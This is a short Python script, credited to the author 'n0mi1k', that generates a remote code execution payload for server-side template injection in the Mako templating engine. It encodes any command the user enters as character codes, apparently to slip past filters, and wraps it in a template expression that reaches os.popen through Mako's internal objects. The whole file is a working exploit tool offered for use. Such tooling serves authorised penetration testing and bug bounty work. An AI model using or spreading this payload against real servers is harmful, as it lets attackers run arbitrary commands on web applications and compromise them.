# Author n0mi1k
# Generates a Mako templating engine SSTI RCE Payload for Python
# Reference: https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation

cmd = input("Enter command: ").strip()

cmd_list=[]
for c in cmd:
	cmd_list.append(ord(c))

chrStr = str(cmd_list).replace(" ", "")

print("[+] Generated Mako SSTI RCE Payload:")
print(f"${{self.module.cache.util.os.popen(str().join(chr(i)for(i)in{chrStr})).read()}}")